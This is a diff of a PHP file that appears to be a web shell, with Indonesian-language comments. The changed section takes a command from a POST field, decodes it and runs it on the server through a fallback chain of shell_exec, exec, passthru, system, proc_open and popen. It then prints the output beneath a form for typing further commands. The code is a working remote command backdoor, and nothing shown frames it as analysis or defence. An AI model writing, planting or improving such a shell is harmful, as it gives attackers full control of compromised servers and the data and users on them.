@@ -899,11 +899,14 @@ if($awal=="phpinfo")
 {
 	print "<div style='width: 100%; height: 400px;'><iframe src='?awal=pinf' style='width: 100%; height: 400px; border: 0;'></iframe></div>";
 }
-elseif ($awal == "sistem_kom") {
+if ($awal == "sistem_kom") {
     if (isset($_POST['kom']) && is_string($_POST['kom']) && !empty($_POST['kom'])) {
-        $komanda = urldecode($_POST['kom']); // Hapus validasi regex
-
-        // Pilih metode eksekusi perintah
+        // Dekode perintah dan pastikan untuk menangkap error output dengan "2>&1"
+        $komanda = uraikan(urldecode($_POST['kom']));
+        if (stripos($komanda, '2>&1') === false) {
+            $komanda .= " 2>&1";
+        }
+        
         $output = '';
         if (function_exists('shell_exec')) {
             // Menggunakan shell_exec
@@ -913,18 +916,21 @@ elseif ($awal == "sistem_kom") {
             exec($komanda, $outputArray);
             $output = implode("\n", $outputArray);
         } elseif (function_exists('passthru')) {
+            // Menggunakan passthru
             ob_start();
             passthru($komanda);
             $output = ob_get_clean();
         } elseif (function_exists('system')) {
+            // Menggunakan system
             ob_start();
             system($komanda);
             $output = ob_get_clean();
         } elseif (function_exists('proc_open')) {
+            // Menggunakan proc_open
             $descriptorspec = [
-                0 => ["pipe", "r"],
-                1 => ["pipe", "w"],
-                2 => ["pipe", "w"]
+                0 => ["pipe", "r"], // stdin
+                1 => ["pipe", "w"], // stdout
+                2 => ["pipe", "w"]  // stderr
             ];
             $process = proc_open($komanda, $descriptorspec, $pipes);
             if (is_resource($process)) {
@@ -933,6 +939,7 @@ elseif ($awal == "sistem_kom") {
                 proc_close($process);
             }
         } elseif (function_exists('popen')) {
+            // Menggunakan popen
             $handle = popen($komanda, 'r');
             if ($handle) {
                 $output = '';
@@ -944,16 +951,17 @@ elseif ($awal == "sistem_kom") {
         } else {
             die("Tidak ada metode eksekusi perintah yang tersedia.");
         }
-
+        
+        // Pastikan output berupa string
         $output = $output ?? "";
-        print '<pre style="max-height: 350px; overflow: auto; border: 1px solid #777; padding: 5px;">' . htmlspecialchars($output) . '</pre><hr>';
+        echo '<pre style="max-height: 350px; overflow: auto; border: 1px solid #777; padding: 5px;">' . htmlspecialchars($output) . '</pre><hr>';
     }
     ?>
-    <!-- Form untuk input command -->
+    <!-- Form input perintah -->
     <form method="POST" action="">
-      <input type="hidden" name="awal" value="sistem_kom">
-      <input type="text" id="emr_et_atash" name="kom" style="width: 500px;">
-      <button type="submit" class="btn">确定</button>
+        <input type="hidden" name="awal" value="sistem_kom">
+        <input type="text" id="emr_et_atash" name="kom" style="width: 500px;" placeholder="Tulis perintah di sini">
+        <button type="submit" class="btn">确定</button>
     </form>
     <?php
 }
